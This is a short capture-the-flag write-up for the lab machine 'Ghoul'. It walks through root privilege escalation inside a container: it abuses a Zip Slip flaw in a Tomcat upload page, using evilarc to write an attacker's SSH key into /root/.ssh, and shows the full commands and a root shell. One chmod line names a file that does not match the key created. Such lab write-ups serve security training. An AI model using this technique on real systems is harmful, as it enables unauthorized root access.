# Alternative way to exploit Ghoul

## Privilege Escalation on the Container

This way is possible after getting access to the first container _(172.20.0.10)_ as _www-data_.

When checking the listening ports on the container, it shows that port 8080 listens on localhost:
```
netstat -alnp | grep LISTEN

tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
```

The service on port 8080 is **Tomcat** and runs as root:
```
ps -ef | grep tomcat

root    13    1    0    16:17    ?        00:00:27 /usr/bin/java -Djava.util.logging.config.file
(...)
```

This means that by exploiting the **Zip Slip vulnerability**, we are able to upload an SSH key on the container owned by root to login as root.

Creating SSH key on local client:
```
ssh-keygen -f ghoul_container_root

mv ghoul_container_root.pub authorized_keys

chmod 600 ghoul_unintended-way
```

Compressing the public key with **evilarc**:
```
python /opt/evilarc/evilarc.py -o unix -d 2 -p /root/.ssh/ authorized_keys
```

After uploading the ZIP file from the web page on port 8080, the SSH key gets uploaded in the root directory and it is possible to login as root to the container:
```
ssh -i ghoul_container_root 10.10.10.101
```
```
root@Aogiri:~# id
uid=0(root) gid=0(root) groups=0(root)
```
